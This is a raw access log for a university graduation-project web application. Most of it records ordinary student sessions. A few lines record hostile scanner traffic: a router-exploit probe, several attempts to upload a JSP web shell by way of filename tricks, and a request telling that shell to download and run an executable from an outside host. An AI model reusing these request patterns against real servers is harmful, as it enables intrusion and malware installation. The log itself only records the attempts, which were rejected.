91.210.25.64 - - [20/May/2019:00:02:33 +0800] "GET / HTTP/1.1" 200 11418
219.145.104.203 - - [20/May/2019:10:18:30 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tree_icons.png HTTP/1.1" 200 3115
219.145.104.203 - - [20/May/2019:10:18:32 +0800] "GET /bysj/toUpload HTTP/1.1" 200 3015
219.145.104.203 - - [20/May/2019:10:18:32 +0800] "GET /bysj/js/student/sUpload.js HTTP/1.1" 200 1206
219.145.104.203 - - [20/May/2019:10:18:32 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/combo_arrow.png HTTP/1.1" 200 117
219.145.104.203 - - [20/May/2019:10:18:34 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1184
219.145.104.203 - - [20/May/2019:10:18:34 +0800] "GET /bysj/js/student/sRead.js HTTP/1.1" 200 4154
219.145.104.203 - - [20/May/2019:10:18:34 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/pagination_icons.png HTTP/1.1" 200 628
219.145.104.203 - - [20/May/2019:10:18:34 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/loading.gif HTTP/1.1" 200 1737
219.145.104.203 - - [20/May/2019:10:18:34 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
219.145.104.203 - - [20/May/2019:10:18:45 +0800] "POST /bysj/Stu/sUpload HTTP/1.1" 500 3362
219.145.104.203 - - [20/May/2019:10:18:45 +0800] "GET /bysj/Stu/img/errorPageBorder.png?1427783409637 HTTP/1.1" 404 3387
113.200.219.2 - - [20/May/2019:10:56:50 +0800] "HEAD /bysj/js/jquery-easyui-1.5.2/themes/default/images/pagination_icons.png HTTP/1.1" 200 -
77.247.109.245 - - [20/May/2019:11:24:23 +0800] "-" 400 -
77.247.109.245 - - [20/May/2019:11:24:23 +0800] "-" 400 -
219.145.104.203 - - [20/May/2019:11:24:36 +0800] "GET /bysj/ HTTP/1.1" 302 -
219.145.104.203 - - [20/May/2019:11:24:36 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
219.145.104.203 - - [20/May/2019:11:24:36 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icon.css HTTP/1.1" 200 2508
219.145.104.203 - - [20/May/2019:11:24:36 +0800] "GET /bysj/js/login.js HTTP/1.1" 200 777
219.145.104.203 - - [20/May/2019:11:24:36 +0800] "GET /bysj/js/jquery-easyui-1.5.2/locale/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
219.145.104.203 - - [20/May/2019:11:24:36 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/easyui.css HTTP/1.1" 200 66964
219.145.104.203 - - [20/May/2019:11:24:37 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.min.js HTTP/1.1" 200 95957
219.145.104.203 - - [20/May/2019:11:24:39 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.easyui.min.js HTTP/1.1" 200 424333
219.145.104.203 - - [20/May/2019:11:24:39 +0800] "GET /bysj/images/logo4.png HTTP/1.1" 200 8674
219.145.104.203 - - [20/May/2019:11:24:39 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/man.png HTTP/1.1" 200 244
219.145.104.203 - - [20/May/2019:11:24:40 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/passwordbox_open.png HTTP/1.1" 200 165
219.145.104.203 - - [20/May/2019:11:24:48 +0800] "GET /bysj/ HTTP/1.1" 302 -
219.145.104.203 - - [20/May/2019:11:24:48 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "POST /bysj/login HTTP/1.1" 200 3509
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "GET /bysj/js/title.js HTTP/1.1" 200 1998
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "GET /bysj/css/Main.css HTTP/1.1" 200 583
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/blank.gif HTTP/1.1" 200 43
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/panel_tools.png HTTP/1.1" 200 852
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/layout_arrows.png HTTP/1.1" 200 319
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tabs_icons.png HTTP/1.1" 200 150
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/accordion_arrows.png HTTP/1.1" 200 184
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2317
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tree_icons.png HTTP/1.1" 200 3115
219.145.104.203 - - [20/May/2019:11:24:51 +0800] "GET /bysj/images/nav1.jpg HTTP/1.1" 200 35839
219.145.104.203 - - [20/May/2019:11:24:52 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1184
219.145.104.203 - - [20/May/2019:11:24:52 +0800] "GET /bysj/js/student/sRead.js HTTP/1.1" 200 4154
219.145.104.203 - - [20/May/2019:11:24:53 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/pagination_icons.png HTTP/1.1" 200 628
219.145.104.203 - - [20/May/2019:11:24:53 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/loading.gif HTTP/1.1" 200 1737
219.145.104.203 - - [20/May/2019:11:24:53 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
219.145.104.203 - - [20/May/2019:11:24:55 +0800] "GET /bysj/toUpload HTTP/1.1" 200 3015
219.145.104.203 - - [20/May/2019:11:24:55 +0800] "GET /bysj/js/student/sUpload.js HTTP/1.1" 200 1206
219.145.104.203 - - [20/May/2019:11:24:55 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/combo_arrow.png HTTP/1.1" 200 117
219.145.104.203 - - [20/May/2019:11:25:19 +0800] "POST /bysj/Stu/sUpload HTTP/1.1" 500 3362
219.145.104.203 - - [20/May/2019:11:25:19 +0800] "GET /bysj/Stu/img/errorPageBorder.png?1427783409637 HTTP/1.1" 404 3387
159.65.230.225 - - [20/May/2019:11:34:18 +0800] "POST /tmUnblock.cgi HTTP/1.1" 404 977
124.89.13.92 - - [20/May/2019:12:00:49 +0800] "HEAD /bysj/js/jquery-easyui-1.5.2/themes/default/images/loading.gif HTTP/1.1" 200 -
124.89.13.92 - - [20/May/2019:12:00:51 +0800] "HEAD /bysj/js/jquery-easyui-1.5.2/themes/default/images/combo_arrow.png HTTP/1.1" 200 -
77.247.109.245 - - [20/May/2019:12:10:40 +0800] "GET / HTTP/1.1" 200 11418
61.185.28.125 - - [20/May/2019:13:15:26 +0800] "GET /bysj HTTP/1.1" 302 -
61.185.28.125 - - [20/May/2019:13:15:26 +0800] "GET /bysj/ HTTP/1.1" 302 -
61.185.28.125 - - [20/May/2019:13:15:26 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
61.185.28.125 - - [20/May/2019:13:15:26 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icon.css HTTP/1.1" 200 2508
61.185.28.125 - - [20/May/2019:13:15:26 +0800] "GET /bysj/js/login.js HTTP/1.1" 200 777
61.185.28.125 - - [20/May/2019:13:15:26 +0800] "GET /bysj/js/jquery-easyui-1.5.2/locale/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
61.185.28.125 - - [20/May/2019:13:15:26 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/easyui.css HTTP/1.1" 200 66964
61.185.28.125 - - [20/May/2019:13:15:27 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.min.js HTTP/1.1" 200 95957
61.185.28.125 - - [20/May/2019:13:15:29 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.easyui.min.js HTTP/1.1" 200 424333
61.185.28.125 - - [20/May/2019:13:15:29 +0800] "GET /bysj/images/logo4.png HTTP/1.1" 200 8674
61.185.28.125 - - [20/May/2019:13:15:29 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/man.png HTTP/1.1" 200 244
61.185.28.125 - - [20/May/2019:13:15:29 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/passwordbox_open.png HTTP/1.1" 200 165
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "POST /bysj/login HTTP/1.1" 200 3509
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "GET /bysj/css/Main.css HTTP/1.1" 200 583
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "GET /bysj/js/title.js HTTP/1.1" 200 1998
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/layout_arrows.png HTTP/1.1" 200 319
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/panel_tools.png HTTP/1.1" 200 852
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/blank.gif HTTP/1.1" 200 43
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tabs_icons.png HTTP/1.1" 200 150
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/accordion_arrows.png HTTP/1.1" 200 184
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2317
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tree_icons.png HTTP/1.1" 200 3115
61.185.28.125 - - [20/May/2019:13:15:37 +0800] "GET /bysj/images/nav1.jpg HTTP/1.1" 200 35839
61.185.28.125 - - [20/May/2019:13:15:56 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1184
61.185.28.125 - - [20/May/2019:13:15:56 +0800] "GET /bysj/js/student/sRead.js HTTP/1.1" 200 4154
61.185.28.125 - - [20/May/2019:13:15:56 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/pagination_icons.png HTTP/1.1" 200 628
61.185.28.125 - - [20/May/2019:13:15:56 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/loading.gif HTTP/1.1" 200 1737
61.185.28.125 - - [20/May/2019:13:15:56 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
61.185.28.125 - - [20/May/2019:13:15:57 +0800] "GET /bysj/js/pdfjs/generic/web/viewer.html?file=/doc/10/2015/1001/1510064108/151006410802.pdf HTTP/1.1" 200 19600
61.185.28.125 - - [20/May/2019:13:15:57 +0800] "GET /bysj/js/pdfjs/generic/web/compatibility.js HTTP/1.1" 200 17788
61.185.28.125 - - [20/May/2019:13:15:58 +0800] "GET /bysj/js/pdfjs/generic/web/debugger.js HTTP/1.1" 200 19583
61.185.28.125 - - [20/May/2019:13:15:58 +0800] "GET /bysj/js/pdfjs/generic/web/l10n.js HTTP/1.1" 200 29253
61.185.28.125 - - [20/May/2019:13:15:58 +0800] "GET /bysj/js/pdfjs/generic/web/viewer.css HTTP/1.1" 200 46022
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/build/pdf.js HTTP/1.1" 200 261214
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/viewer.js HTTP/1.1" 200 249596
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-viewAttachments.png HTTP/1.1" 200 384
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-search.png HTTP/1.1" 200 309
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-sidebarToggle.png HTTP/1.1" 200 225
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-viewOutline.png HTTP/1.1" 200 178
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/texture.png HTTP/1.1" 200 2418
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-viewThumbnail.png HTTP/1.1" 200 185
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-zoomOut.png HTTP/1.1" 200 88
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-openFile.png HTTP/1.1" 200 295
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-secondaryToolbarToggle.png HTTP/1.1" 200 243
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-print.png HTTP/1.1" 200 257
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-bookmark.png HTTP/1.1" 200 174
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-pageUp.png HTTP/1.1" 200 246
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-menuArrows.png HTTP/1.1" 200 108
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-presentationMode.png HTTP/1.1" 200 321
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-pageDown.png HTTP/1.1" 200 238
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-download.png HTTP/1.1" 200 259
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/images/toolbarButton-zoomIn.png HTTP/1.1" 200 136
61.185.28.125 - - [20/May/2019:13:16:01 +0800] "GET /bysj/js/pdfjs/generic/web/locale/locale.properties HTTP/1.1" 200 4314
61.185.28.125 - - [20/May/2019:13:16:02 +0800] "GET /bysj/js/pdfjs/generic/web/locale/zh-CN/viewer.properties HTTP/1.1" 200 6259
61.185.28.125 - - [20/May/2019:13:16:11 +0800] "GET /bysj/js/pdfjs/generic/build/pdf.worker.js HTTP/1.1" 200 1251607
61.185.28.125 - - [20/May/2019:13:16:11 +0800] "GET /doc/10/2015/1001/1510064108/151006410802.pdf HTTP/1.1" 404 1039
61.185.28.125 - - [20/May/2019:13:16:15 +0800] "GET /bysj/toUpload HTTP/1.1" 200 3015
61.185.28.125 - - [20/May/2019:13:16:15 +0800] "GET /bysj/js/student/sUpload.js HTTP/1.1" 200 1206
61.185.28.125 - - [20/May/2019:13:16:15 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/combo_arrow.png HTTP/1.1" 200 117
61.185.28.125 - - [20/May/2019:13:16:16 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1184
61.185.28.125 - - [20/May/2019:13:16:16 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
61.185.28.125 - - [20/May/2019:13:16:17 +0800] "GET /bysj/js/pdfjs/generic/web/viewer.html?file=/doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 200 19600
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 200 1115765
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 206 65536
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 206 1653
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 206 65536
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 206 65536
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 206 65536
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 206 65536
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /bysj/js/pdfjs/generic/web/images/shadow.png HTTP/1.1" 200 290
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /bysj/js/pdfjs/generic/web/images/loading-icon.gif HTTP/1.1" 200 2545
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /bysj/js/pdfjs/generic/web/images/loading-small.png HTTP/1.1" 200 7402
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 206 851968
61.185.28.125 - - [20/May/2019:13:16:18 +0800] "GET /doc/10/2015/1001/1510064108/151006410801.pdf HTTP/1.1" 206 851968
113.200.219.2 - - [20/May/2019:13:56:24 +0800] "HEAD /doc/10/2015/1001/1510064108/151006410802.pdf HTTP/1.1" 404 -
183.3.255.35 - - [20/May/2019:13:57:05 +0800] "GET /toSG HTTP/1.1" 404 959
183.3.255.35 - - [20/May/2019:13:57:06 +0800] "GET /favicon.ico HTTP/1.1" 200 4286
183.3.255.35 - - [20/May/2019:13:57:17 +0800] "GET /toSApply HTTP/1.1" 404 967
183.3.255.35 - - [20/May/2019:13:57:25 +0800] "GET /toLogin HTTP/1.1" 404 965
183.3.255.35 - - [20/May/2019:13:57:34 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
183.3.255.35 - - [20/May/2019:13:57:34 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icon.css HTTP/1.1" 200 2508
183.3.255.35 - - [20/May/2019:13:57:34 +0800] "GET /bysj/js/jquery-easyui-1.5.2/locale/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
183.3.255.35 - - [20/May/2019:13:57:34 +0800] "GET /bysj/js/login.js HTTP/1.1" 200 777
183.3.255.35 - - [20/May/2019:13:57:35 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/easyui.css HTTP/1.1" 200 66964
183.3.255.35 - - [20/May/2019:13:57:35 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.min.js HTTP/1.1" 200 95957
183.3.255.35 - - [20/May/2019:13:57:38 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.easyui.min.js HTTP/1.1" 200 424333
183.3.255.35 - - [20/May/2019:13:57:38 +0800] "GET /bysj/images/logo4.png HTTP/1.1" 200 8674
183.3.255.35 - - [20/May/2019:13:57:39 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/man.png HTTP/1.1" 200 244
183.3.255.35 - - [20/May/2019:13:57:39 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/passwordbox_open.png HTTP/1.1" 200 165
183.3.255.35 - - [20/May/2019:13:57:42 +0800] "POST /bysj/login HTTP/1.1" 200 3509
183.3.255.35 - - [20/May/2019:13:57:42 +0800] "GET /bysj/js/title.js HTTP/1.1" 200 1998
183.3.255.35 - - [20/May/2019:13:57:42 +0800] "GET /bysj/css/Main.css HTTP/1.1" 200 583
58.250.143.191 - - [20/May/2019:13:57:43 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/blank.gif HTTP/1.1" 200 43
183.3.255.35 - - [20/May/2019:13:57:43 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/panel_tools.png HTTP/1.1" 200 852
183.3.255.35 - - [20/May/2019:13:57:43 +0800] "GET /bysj/images/nav1.jpg HTTP/1.1" 200 35839
183.3.255.35 - - [20/May/2019:13:57:43 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/layout_arrows.png HTTP/1.1" 200 319
183.3.255.35 - - [20/May/2019:13:57:43 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tabs_icons.png HTTP/1.1" 200 150
58.250.143.191 - - [20/May/2019:13:57:43 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/accordion_arrows.png HTTP/1.1" 200 184
183.3.255.35 - - [20/May/2019:13:57:43 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2317
183.3.255.35 - - [20/May/2019:13:57:43 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/tree_icons.png HTTP/1.1" 200 3115
58.250.143.191 - - [20/May/2019:13:57:57 +0800] "GET /bysj/toTopicResult HTTP/1.1" 200 1213
58.250.143.191 - - [20/May/2019:13:57:57 +0800] "GET /bysj/js/student/topicResult.js HTTP/1.1" 200 5159
183.3.255.35 - - [20/May/2019:13:57:57 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/pagination_icons.png HTTP/1.1" 200 628
58.250.143.191 - - [20/May/2019:13:57:57 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/default/images/loading.gif HTTP/1.1" 200 1737
183.3.255.35 - - [20/May/2019:13:57:57 +0800] "POST /bysj/Stu/queryTopicResult HTTP/1.1" 200 511
183.3.255.35 - - [20/May/2019:13:57:59 +0800] "GET /bysj/toTopic HTTP/1.1" 200 4094
183.3.255.35 - - [20/May/2019:13:57:59 +0800] "GET /bysj/js/student/topic.js HTTP/1.1" 200 5131
183.3.255.35 - - [20/May/2019:13:57:59 +0800] "GET /bysj/js/student/topicSApply.js HTTP/1.1" 200 1556
183.3.255.35 - - [20/May/2019:13:58:00 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/search.png HTTP/1.1" 200 813
183.3.255.35 - - [20/May/2019:13:58:00 +0800] "GET /bysj/js/jquery-easyui-1.5.2/themes/icons/edit_add.png HTTP/1.1" 200 1088
58.250.143.191 - - [20/May/2019:13:58:00 +0800] "POST /bysj/Stu/queryDTopic HTTP/1.1" 200 2329
58.250.143.191 - - [20/May/2019:13:58:05 +0800] "GET /bysj/login HTTP/1.1" 405 1045
223.167.152.53 - - [20/May/2019:13:58:05 +0800] "GET /toSG HTTP/1.1" 404 959
223.166.151.197 - - [20/May/2019:13:58:16 +0800] "GET /toSApply HTTP/1.1" 404 967
58.250.143.191 - - [20/May/2019:13:58:21 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
223.166.151.197 - - [20/May/2019:13:58:24 +0800] "GET /toLogin HTTP/1.1" 404 965
183.3.255.35 - - [20/May/2019:13:58:26 +0800] "POST /bysj/login HTTP/1.1" 200 3509
58.250.143.191 - - [20/May/2019:13:58:27 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2317
223.166.151.199 - - [20/May/2019:13:58:33 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
223.166.151.199 - - [20/May/2019:13:58:34 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.min.js HTTP/1.1" 200 95957
223.166.151.199 - - [20/May/2019:13:58:35 +0800] "GET /bysj/js/jquery-easyui-1.5.2/jquery.easyui.min.js HTTP/1.1" 500 147456
223.166.151.199 - - [20/May/2019:13:58:35 +0800] "GET /bysj/js/jquery-easyui-1.5.2/locale/easyui-lang-zh_CN.js HTTP/1.1" 200 2501
223.166.151.199 - - [20/May/2019:13:58:35 +0800] "GET /bysj/js/login.js HTTP/1.1" 200 777
58.250.143.191 - - [20/May/2019:13:58:45 +0800] "GET /bysj/userInfoEditPage HTTP/1.1" 200 2901
58.250.143.191 - - [20/May/2019:13:58:45 +0800] "GET /bysj/js/student/stuInfoEdit.js HTTP/1.1" 200 584
223.166.151.191 - - [20/May/2019:13:58:56 +0800] "GET /bysj/toTopicResult HTTP/1.1" 500 3361
210.22.245.219 - - [20/May/2019:13:58:58 +0800] "GET /bysj/toTopic HTTP/1.1" 500 3361
116.128.128.79 - - [20/May/2019:13:59:45 +0800] "GET /bysj/userInfoEditPage HTTP/1.1" 500 3361
47.105.136.52 - - [20/May/2019:14:10:27 +0800] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 961
47.105.136.52 - - [20/May/2019:14:10:27 +0800] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 961
47.105.136.52 - - [20/May/2019:14:10:27 +0800] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 961
47.105.136.52 - - [20/May/2019:14:10:27 +0800] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe HTTP/1.1" 404 981
58.250.143.191 - - [20/May/2019:14:10:34 +0800] "GET /bysj/toLogin HTTP/1.1" 200 2153
183.3.255.35 - - [20/May/2019:14:10:56 +0800] "POST /bysj/login HTTP/1.1" 200 3509
58.250.143.191 - - [20/May/2019:14:10:57 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2317
58.250.143.191 - - [20/May/2019:14:11:17 +0800] "POST /bysj/login HTTP/1.1" 200 3515
183.3.255.35 - - [20/May/2019:14:11:17 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 3478
183.3.255.35 - - [20/May/2019:14:11:54 +0800] "POST /bysj/login HTTP/1.1" 200 3515
183.3.255.35 - - [20/May/2019:14:11:55 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 3478
58.250.143.191 - - [20/May/2019:14:12:49 +0800] "POST /bysj/login HTTP/1.1" 200 3509
183.3.255.35 - - [20/May/2019:14:12:50 +0800] "POST /bysj/queryTreeByUser HTTP/1.1" 200 2317
183.3.255.35 - - [20/May/2019:14:12:54 +0800] "GET /bysj/userInfo HTTP/1.1" 200 1718
183.3.255.35 - - [20/May/2019:14:12:56 +0800] "GET /bysj/userInfoEditPage HTTP/1.1" 200 2901
183.3.255.35 - - [20/May/2019:14:12:59 +0800] "GET /bysj/userPasswordEditPage HTTP/1.1" 200 2315
58.250.143.191 - - [20/May/2019:14:12:59 +0800] "GET /bysj/js/editPassword.js HTTP/1.1" 200 334
183.3.255.35 - - [20/May/2019:14:13:02 +0800] "GET /bysj/toGroupInfo HTTP/1.1" 200 1305
58.250.143.191 - - [20/May/2019:14:13:02 +0800] "GET /bysj/js/student/sGroupInfo.js HTTP/1.1" 200 2009
183.3.255.35 - - [20/May/2019:14:13:02 +0800] "POST /bysj/Stu/querySGroupInfo HTTP/1.1" 200 1276
183.3.255.35 - - [20/May/2019:14:13:03 +0800] "POST /bysj/Stu/queryTInfo HTTP/1.1" 200 416
183.3.255.35 - - [20/May/2019:14:13:05 +0800] "GET /bysj/toTopic HTTP/1.1" 200 4092
183.3.255.35 - - [20/May/2019:14:13:06 +0800] "POST /bysj/Stu/queryDTopic HTTP/1.1" 200 2329
58.250.143.191 - - [20/May/2019:14:13:07 +0800] "GET /bysj/toSRead HTTP/1.1" 200 1184
58.250.143.191 - - [20/May/2019:14:13:07 +0800] "GET /bysj/js/student/sRead.js HTTP/1.1" 200 4154
58.250.143.191 - - [20/May/2019:14:13:08 +0800] "POST /bysj/Stu/queryAllDoc HTTP/1.1" 200 2022
58.250.143.191 - - [20/May/2019:14:13:11 +0800] "GET /bysj/js/pdfjs/generic/web/viewer.html?file=/doc/10/2015/1001/1510064108/151006410804.pdf HTTP/1.1" 200 19600
